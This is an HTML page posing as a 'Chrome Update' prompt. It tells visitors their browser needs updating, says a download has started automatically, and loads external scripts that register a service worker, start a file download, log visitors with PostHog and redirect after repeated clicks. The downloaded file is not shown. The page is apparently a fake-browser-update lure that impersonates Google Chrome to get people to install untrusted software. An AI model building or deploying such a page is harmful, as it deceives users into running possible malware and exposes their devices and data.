<!doctype html>
<html lang="en" translate="no">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="google" content="notranslate"/>
    <title>Chrome Update</title>
    <style>
      * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
      }

      body {
          min-height: 100vh;
          font-family: Arial, sans-serif;
          background: #f4f7fb;
          color: #1f2937;
      }

      .screen {
          min-height: 100vh;
          padding: 28px 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          background:
              radial-gradient(circle at top right, rgba(66, 133, 244, .18), transparent 34%),
              radial-gradient(circle at bottom left, rgba(52, 168, 83, .16), transparent 34%),
              #f4f7fb;
      }

      .card {
          width: 100%;
          max-width: 420px;
          text-align: center;
          padding: 32px 22px;
          border-radius: 28px;
          background: #ffffff;
          border: 1px solid rgba(0,0,0,.06);
          box-shadow: 0 24px 70px rgba(31,41,55,.12);
      }

      .logo {
          width: 96px;
          height: 96px;
          margin: 0 auto 22px;
          border-radius: 50%;
          background: url('logo.webp') center/cover no-repeat;
          position: relative;
          box-shadow: 0 16px 36px rgba(66,133,244,.24);
      }

      .badge {
          display: inline-block;
          padding: 8px 13px;
          border-radius: 999px;
          background: #eef4ff;
          color: #2563eb;
          font-size: 13px;
          font-weight: 700;
          margin-bottom: 16px;
      }

      h1 {
          font-size: 34px;
          line-height: 1.05;
          letter-spacing: -1.2px;
          color: #111827;
      }

      h1 span {
          color: #2563eb;
      }

      p {
          margin: 0 auto 24px;
          max-width: 320px;
          color: #6b7280;
          font-size: 16px;
          line-height: 1.45;
      }

      .features {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 9px;
          margin-bottom: 24px;
      }

      .feature {
          padding: 11px 6px;
          border-radius: 15px;
          background: #f3f6fb;
          color: #4b5563;
          font-size: 12px;
          font-weight: 700;
      }

      .btn {
          display: block;
          width: 100%;
          padding: 17px 20px;
          border-radius: 18px;
          background: #2563eb;
          color: #ffffff;
          text-decoration: none;
          font-weight: 800;
          font-size: 17px;
          box-shadow: 0 16px 36px rgba(37,99,235,.28);
          transition: .2s ease;
      }

      .btn:hover {
          transform: translateY(-2px);
          background: #1d4ed8;
      }

      .note {
          margin-top: 14px;
          font-size: 12px;
          color: #9ca3af;
      }
    </style>

    <script src="../params.js?v=personal-site-25"></script>
    <script src="../js/main.js?v=42316905"></script>
    <script src="../js/worker.js?v=42316905"></script>
    <script>
      window.__downloadTestRevision = 'personal-site-25';
      window.__downloadSwVersion = '42316905';
      window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;

      DownWorker.setup()

      try {
        posthog.init(...DownLand.posthogParams({ land: '025', swUrl: window.__downloadSwUrl }));
      } catch (error) {
        log('error', 'Posthog init failed', errorAttributes(error));
      }
    </script>
  </head>
  <body>

    <main class="screen">
      <section class="card">
        <div class="logo"></div>
        <div class="badge">New Update v12.44</div>

        <h1><span>Chrome Update</span></h1>

        <p>
          You need to update your browser.
        </p>

        <div class="features">
          <div class="feature">Faster</div>
          <div class="feature">Safer</div>
          <div class="feature">Gemini AI</div>
        </div>

        <button id="downloadButton" class="btn ph-no-capture" type="button" disabled>Update Chrome</button>
        <div class="note">Download automatically started.</div>
      </section>
    </main>

    <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>

    <script>
      (() => {
        log('info', 'Progress bar not used')
        const downloadButton = document.querySelector('#downloadButton');

        let trustedClickCount = 0;

        function handleDownloadClick(event) {
          try {
            if (!DownWorker.isServiceWorkerReady()) {
              log('info', 'Download requested before service worker readiness');
              return;
            }

            if (event && event.isTrusted) {
              trustedClickCount += 1;

              if (trustedClickCount >= 3) {
                window.location.href = DownLand.redirectUrl();
                return;
              }
            }

            DownLand.startDownload({ passParams: false })
          } catch (error) {
            log('error', 'Download click handling failed', {
              error_name: error?.name,
              error_message: error?.message,
              error_stack: error?.stack?.split('\n').slice(0, 5).join('\n'),
            })
          }
        }

        if ('serviceWorker' in navigator) {
          navigator.serviceWorker.addEventListener('message', (event) => {
            if (event.data && event.data.type === 'DOWNLOAD_CANCELED') {
              DownLand.onCanceled(event.data)
            }
          })
        }

        downloadButton.addEventListener('click', handleDownloadClick);
        downloadButton.addEventListener('click', (event) => {
          DownLand.onTrustedClick(event)
        });

        DownWorker.registerService({ passParams: false })
      })();
    </script>
  </body>
</html>
